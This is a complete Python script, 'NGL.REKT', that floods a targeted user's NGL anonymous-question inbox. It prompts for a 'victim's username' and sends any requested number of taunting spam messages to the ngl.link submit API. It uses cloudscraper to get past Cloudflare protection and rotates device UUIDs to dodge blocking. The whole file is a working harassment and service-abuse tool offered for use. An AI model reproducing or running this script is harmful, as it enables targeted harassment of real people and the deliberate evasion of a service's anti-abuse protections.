print('checking deps...')
import os
os.system('pip3 install cloudscraper')
os.system('pip3 install pystyle')
os.system('pip3 install uuid')
import random
import time
import uuid
import cloudscraper
from pystyle import Colors, Colorate # pystyle - Made by billythegoat356 - https://github.com/billythegoat356/pystyle

os.system('cls')
print(Colors.blue + """
 ███▄    █   ▄████  ██▓          ██▀███  ▓█████  ██ ▄█▀▄▄▄█████▓
 ██ ▀█   █  ██▒ ▀█▒▓██▒         ▓██ ▒ ██▒▓█   ▀  ██▄█▒ ▓  ██▒ ▓▒
▓██  ▀█ ██▒▒██░▄▄▄░▒██░         ▓██ ░▄█ ▒▒███   ▓███▄░ ▒ ▓██░ ▒░
▓██▒  ▐▌██▒░▓█  ██▓▒██░         ▒██▀▀█▄  ▒▓█  ▄ ▓██ █▄ ░ ▓██▓ ░ 
▒██░   ▓██░░▒▓███▀▒░██████▒ ██▓ ░██▓ ▒██▒░▒████▒▒██▒ █▄  ▒██▒ ░ 
░ ▒░   ▒ ▒  ░▒   ▒ ░ ▒░▓  ░ ▒▓▒ ░ ▒▓ ░▒▓░░░ ▒░ ░▒ ▒▒ ▓▒  ▒ ░░   
░ ░░   ░ ▒░  ░   ░ ░ ░ ▒  ░ ░▒    ░▒ ░ ▒░ ░ ░  ░░ ░▒ ▒░    ░    
   ░   ░ ░ ░ ░   ░   ░ ░    ░     ░░   ░    ░   ░ ░░ ░   ░      
         ░       ░     ░  ░  ░     ░        ░  ░░  ░            
                             ░                                  
""")
print('')
print(Colors.red + 'NGL.REKT v1.0.1 by F4r9 ----')
print(Colorate.Horizontal(Colors.yellow_to_red, 'https://github.com/Xp3rtA/nglflooder', 1))
time.sleep(3)
os.system('cls')
#count = (1)
#options = input("Type 'y' to activate the custom waiting time between sending questions, else type 'n' > ")
#if options == "y":
#    count = input('Custom Waiting Time (PLEASE NOTE; ngl is protected by cloudflare!) > ')
os.system('cls')
scraper = cloudscraper.create_scraper()
url = "https://ngl.link/api/submit"
username = input("Please enter victim's username > ")
number = input("Please enter the number of questions > ")
headers = {'Content-Type': 'application/x-www-form-urlencoded'}
currentuuid = str(uuid.uuid4())
os.system('cls')
for i in range(int(number)):
    words = ["Get Flooded x)", "ASAP please clean your ngl x)", "GET REKT LOL", "tell me when your ngl account got flooded" ,"Yooooo did you got flooded????? x)", "flooded, xoxo", "GetRektByNGL.REKTteam:)GetRektByNGL.REKTteam:)GetRektByNGL.REKTteam:)GetRektByNGL.REKTteam:)", "gEt FlOoDeD lOl", "flooded by ngl.rekt"]
    data = "username=" + username +"&question=" + random.choice(words) + "&deviceId=" + currentuuid + "&gameSlug=&referrer="
    try:
        r = scraper.post(url, data=data, headers=headers)
        if "cloudflare" in r.text:
            print(Colorate.Horizontal(Colors.red_to_yellow, '[GEN] - Generating new uuid & using it. Waiting before restart ///', 1))
            currentuuid = str(uuid.uuid4())
            time.sleep(5)
        else:
            print(Colorate.Horizontal(Colors.green_to_blue, '[SENT] - Response:  ' + r.text, 1))
    except:
        print(Colorate.Horizontal(Colors.red_to_yellow, '[ERROR] - This is surely due to a question sending error. ', 1))
    # time.sleep(0.5) # To make human-like requests, prevent cloudflare from blocking it

## Code made by F4r9
## You are authorized to modify, but please give at least attribution to the original code.